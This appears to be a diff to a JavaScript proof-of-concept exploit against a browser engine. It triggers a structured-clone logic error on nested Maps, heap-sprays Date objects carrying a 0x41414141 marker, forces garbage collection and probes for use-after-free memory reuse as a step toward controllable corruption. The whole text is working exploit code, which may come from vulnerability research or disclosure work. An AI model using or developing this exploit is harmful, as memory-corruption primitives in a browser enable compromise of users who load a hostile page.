@@ -1,6 +1,9 @@
 import { debug_log } from './module/utils.mjs';
 import { Int } from './module/int64.mjs';
 import { Memory } from './module/mem.mjs';
+import { MB } from './module/constants.mjs';
+
+const POC_MODE = 'crash';
 
 function sleep(ms = 20) {
     return new Promise(resolve => setTimeout(resolve, ms));
@@ -58,6 +61,22 @@ function sprayReplacementObjects(count = 50000) {
     return keepers;
 }
 
+function sprayReplacementDates(count = 60000, marker = 0x41414141) {
+    const keepers = [];
+    for (let i = 0; i < count; i++) {
+        keepers.push(new Date(marker));
+    }
+    return keepers;
+}
+
+function buildIdentityMap(arr) {
+    const m = new Map();
+    for (let i = 0; i < arr.length; i++) {
+        m.set(arr[i], i);
+    }
+    return m;
+}
+
 function sprayStructures() {
     const keepers = [];
     for (let i = 0; i < 50000; i++) {
@@ -75,11 +94,11 @@ function createObjectStructure(num_elems) {
 
     // Markers to identify the confusion
     for (let i = 0; i < 100; i++) {
-        foo.push({id: 0xffff});
+        foo.push(new Date(0xffff));
     }
 
     for (let i = 0; i < num_elems; i++) {
-        const d = {id: i};
+        const d = new Date(i);
         const map = new Map();
         msg.set(d, [map, foo]);
         msg = map;
@@ -98,7 +117,9 @@ export async function main() {
     let idx = null;
     let attempts = 0;
 
-    let warm = sprayStructures();
+    let warm = null;
+    if (POC_MODE !== 'crash')
+        warm = sprayStructures();
 
     debug_log("[*] Starting Stage 1: Triggering Logic Error...");
 
@@ -118,17 +139,14 @@ export async function main() {
         await prom;
         data = data.data;
 
-        pressureAlloc(10, 0x100000);
-        for (let k = 0; k < 8; k++)
-            gc();
+        gc();
         await sleep(0);
 
         let i;
         try {
             for (i = 0; i < num_elems; i++) {
                 const k = data.keys().next().value;
-                const kid = tryGet(k, 'id');
-                if (kid === 0xffff) {
+                if (k.getTime() === 0xffff) {
                     idx = i;
                     break;
                 }
@@ -146,6 +164,12 @@ export async function main() {
     }
 
     debug_log('[+] Stage 1 Triggered! Confused object found at idx: ' + idx);
+
+    if (POC_MODE === 'crash') {
+        alert('triggered, try crash');
+        debug_log('[+] idx: ' + idx);
+        return;
+    }
     
     if (data2) {
         debug_log("[*] Starting Stage 2: Verifying controllable corruption...");
@@ -164,19 +188,49 @@ export async function main() {
         await sleep(100);
 
         debug_log('[*] Spraying replacement objects...');
-        const sprayed = sprayReplacementObjects(60000);
-        pressureAlloc(12, 0x180000);
+        const isDate = (() => {
+            try {
+                return data2 instanceof Date;
+            } catch {
+                return false;
+            }
+        })();
+
+        const sprayed = isDate ? sprayReplacementDates(70000, 0x41414141) : sprayReplacementObjects(60000);
+        const sprayedMap = buildIdentityMap(sprayed);
+
+        pressureAlloc(12, 2 * MB);
         for (let k = 0; k < 50; k++)
             gc();
         await sleep(20);
 
+        let reusedIdx = -1;
+        try {
+            if (sprayedMap.has(data2))
+                reusedIdx = sprayedMap.get(data2);
+        } catch {}
+
         const marker = tryGet(data2, 'marker');
         const rid = tryGet(data2, 'id');
         const rix = tryGet(data2, 'idx');
-        debug_log('[*] Probe data2.id=' + String(rid) + ' marker=' + String(marker) + ' idx=' + String(rix));
+        let dt = undefined;
+        try {
+            if (typeof data2?.getTime === 'function')
+                dt = data2.getTime();
+        } catch {
+            dt = 'throw';
+        }
+
+        debug_log('[*] Probe identityReuse=' + String(reusedIdx) + ' getTime=' + String(dt) + ' id=' + String(rid) + ' marker=' + String(marker) + ' idx=' + String(rix));
+
+        if (reusedIdx !== -1) {
+            debug_log('[+] Strong reuse proof: data2 is identical to a sprayed object (identity hit).');
+        }
 
         if (marker === 0x41414141) {
             debug_log('[+] Memory reuse observed (marker hit). This is more than a pure DoS signal.');
+        } else if (dt === 0x41414141) {
+            debug_log('[+] Memory reuse observed (Date getTime marker hit). This is more than a pure DoS signal.');
         } else {
             debug_log('[!] No marker observed on data2. Still indicates corruption; consider increasing message size/spray.');
         }
